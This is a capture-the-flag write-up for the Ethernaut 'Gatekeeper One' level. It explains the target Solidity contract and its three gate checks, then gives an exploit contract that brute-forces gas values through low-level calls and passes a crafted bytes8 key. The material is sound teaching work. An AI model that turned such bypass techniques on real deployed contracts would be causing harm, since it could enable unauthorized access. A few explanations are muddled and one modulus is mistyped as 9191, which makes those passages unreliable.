# Writeup for Gatekeeper One

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed, and an instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don't worry if you are new to Solidity and have never deployed a smart contract. You can learn how to deploy a contract using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

Make it past the gatekeeper and register as an entrant to pass this level.

### Contract Explanation

If you understand the contract, you can move to the [exploit](#exploit) part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.

<details>
<summary>Click to view the source contract</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

</details>

The contract has a state variable named `entrant`. The state variable `entrant` is a **address** type.

Modifiers in Solidity are special functions that modify the behavior of other functions.

<details>
<summary>Click to check the below example.</summary>

```solidity

contract A{
    address owner;
    constructor(){
        owner=msg.sender;
    }

    function hello() public view returns (string memory){
        require(msg.sender==owner,"Not Owner");
        return "hello";
    }

    function hi() public view returns (string memory){
        require(msg.sender==owner,"Not Owner");
        return "hi";
    }
}


contract B{
    address owner;
    constructor(){
        owner=msg.sender;
    }

    modifier onlyOwner(){
        require(msg.sender==owner,"Not Owner");
    _;
    }

    function hello() public view returns (string memory) onlyOwner{
        return "hello";
    }

    function hi() public view returns (string memory) onlyOwner{
        return "hi";
    }
}
```

If we see the contracts we can observe that in the first contract, we have written the same checks in two functions but in the second one we have written the checks in a modifier and we used a modifier in each function.

When we use `modifier` to a function, the function will first implement the `modifier` logic and then implement the function logic. By using modifiers we can write more optimized code.

</details>

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

The above is a modifier named `gateOne()` which checks whether `tx.origin` is equal to `msg.sender` or not.

```solidity
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
```

The above is a modifier named `gateTwo()`. It checks if `gasleft()%8191` is zero or not. `gasleft()` is an inbuilt function in the solidity that returns the amount of gas left during a contract call. In this case when the gateTwo() is called if `gasleft%8191==0` then the modifier will be passed.

```solidity

modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}

```

```solidity
function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
}
```

The above function takes a **bytes8** argument as input. It executes all the `modifiers` one by one then if all the conditions in `modifiers` are passed then it will set entrant to `tx.origin` and returns `true`.

### Key Concepts to Understand

To exploit this contract we need to understand some key concepts in solidity.

When we interact with contracts using low-level call function it won't revert even if the calls failed. It will just return true or false.

<details>
<summary>Click to check the below example.</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract contract_One{
    function Wish(uint8 _num)public pure returns(string memory){
        if(_num%2==0){
            return "hello";
        }
        else{
            revert();
        }

    }
}

contract contract_two{
    bool public first_call;
    bool public second_call;
    bytes4 private constant FUNC_SELECTOR = bytes4(keccak256("Wish(uint8)"));

    function call_Wish(address _wish)public{
        (bool a,)=_wish.call(abi.encodeWithSelector(FUNC_SELECTOR,2));
        (bool b,)=_wish.call(abi.encodeWithSelector(FUNC_SELECTOR,1));
        first_call=a;
        second_call=b;
    }
}

```

First deploy `contract_one` then deploy `contract_two`. When we invoke `call_Wish()` in `contract_two` the function will make two level calls to contract_one calling the function `Wish()`. The first will be successful but the second call will revert because we are passing odd number. `Wish()` returns true "hello" only when passing even numbers. If we pass an odd number it will revert.

Even though the inner second call is reverted it is not reverting the main call (call_Wish). This behavior is only due to `low-level call`. When we use `low-level call` if the call is successful it returns `true` else it will return `false`.

</details>

One more key concept to learn is how typecasting works.

In Solidity, when a `uint` with a larger number of bits is converted to a type with a smaller number of bits, the first bits/bytes of larger value will be truncated. Same way when a bytes with a larger number of `bytes` is converted to a smaller number of bytes the last bits/bytes will be truncated.

<details>

<summary>Click to check the below example.</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Type_Casting{
    uint96 Number_1=1548647896516548945453658536;
    bytes12 Bytes_1=bytes12((Number_1));
    function uint96_to_uint48()public view returns(bytes32 before_conversion,bytes32 after_conversion,uint48 converted_val){
    before_conversion=bytes32(uint256(Number_1));
    converted_val=uint48(Number_1);
    after_conversion=bytes32(uint256(converted_val));
 }

 function bytes12_to_bytes6()public view returns(bytes32 before_conversion,bytes6 converted_val,bytes32 after_conversion){
    before_conversion=bytes32(Bytes_1);
    converted_val=bytes6(Bytes_1);
    after_conversion=bytes32(converted_val);
 }

}

```

Make sure you try out this in the remix. When we call the functions `uint96_to_uint48()` and `bytes12_to_bytes6()` the output will be as follows.

<p align="center">
  <img src="img/img1.png" />
</p>

If we observe the data of `bytes12_to_bytes6()` when **bytes12** is converted to **bytes6** only the first 6 bytes are taken. If we observe the `uint96_to_uint48()` when uint96 is converted to uint48 only the last 48 bits (6 bytes) are taken. You can find the difference by observing `before_conversion` and `after_conversion`. In the `uint96_to_uint48()` you can verify the `converted_val` by converting `0x0000000000000000000000000000000000000000000000000000f750833e31a8` into decimal.

</details>

### Exploit

Our goal is to call the `enter()` function and pass all the gates (modifiers).

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

We can pass the `gateOne()` by interacting with the contract using our exploit contract. When we interact with GatekeeperOne using our exploit contract `msg.sender` will be our exploit contract address and `tx.origin` will be the address of the Externally Owned Account that is calling the exploit contract.

If you don't know what is `tx.origin` and `msg.sender` refer to the Telephone challenge. Chlick [here](../Telephone/WriteUp.md) to open the WriteUp.

```solidity
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
```

It is checking if `gasleft()%9191==0` or not. `gasleft()` will return the remaining gas after executing the `gasleft()`. We can pass this modifier by making some 100 or 200 `low-level calls` to `GatekeeperOne` `enter()` function with different gas values. The low-level call function will return true only if the call is a success. Using this as an advantage we can pass this modifier.

```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
 _;
}
```

Now let's assume our key as `B1 B2 B3 B4 B5 B6 B7 B8` where each B represents a byte. Since the key is 8 bytes there are 8 B's.

In the first condition, `uint32(uint64(_gateKey))` will return `B5 B6 B7 B8` and `uint16(uint64(_gateKey))` will return `B7 B8`. According to the condition, the bytes are `B5 B6 B7 B8` and `B7 B8`. This condition will only be satisfied if `B5` and `B6` are both zeros. Therefore, we can conclude that the last four bytes of our key will be `00 00 B7 B8`.

In the second condition uint32(uint64(\_gateKey)) will return `B5 B6 B7 B8` and uint64(\_gateKey) will return `B1 B2 B3 B4 B5 B6 B7 B8`. The condition will be satisfied only if `B1 B2 B3 B4` are non-zeros. From this, we can conclude that the key will be `B1 B2 B3 B4 00 00 B7 B8`.

In the third condition uint32(uint64(\_gateKey)) will return `B5 B6 B7 B8` and uint16(uint160(tx.origin)) will return last two bytes of the address. Suppose if our address is `0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5` it will return `0xAfe5`. Assuming this as our wallet address we can conclude that our key will be `B1 B2 B3 B4 00 00 Af e5`.

The only restriction for `B1 B2 B3 B4` is it shouldn't be zero. That means this can be of any value. Now our key will be `aa bb cc dd 00 00 Af e5` which is `0xaabbccdd0000Afe5`.

Don't forget to change the last two bytes to your wallet address.

<details>

<summary>Click to check the exploit contract</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";


contract ExploitGatekeeperOne{
    GatekeeperOne Gate1;
    uint256 gasAmount=81910;
    constructor(address _addr){
        Gate1=GatekeeperOne(_addr);
    }
    function Exploit()public{
        bytes8 Key=0xaabbccdd0000Afe5;
        for(uint256 i=0;i<500;i++){
        (bool success,)=address(Gate1).call{gas:gasAmount+i}(abi.encodeWithSignature("enter(bytes8)",Key));
            if(success){
                break;
            }
        }
        require(Gate1.entrant()==0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5);
    }
}
```

</details>

`gasAmount` is a multiple of `8191` because `i` will be the initial gas usage and after `i` amount of gas. Once the initial gas usage (calls before Gatetwo) is done the gasleft() will be multiple of 8191 and hence `gasleft()%8191` will return 0

Once you call the `Exploit()` function the challenge will be solved. But before calling make sure you change your address in the `ExploitGatekeeperOne` contract.

### Key Takeaways

We have learned about how typecasting works and we discussed how low-level call work. Refer [this](#key-concepts-to-understand) part if you forgot these.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
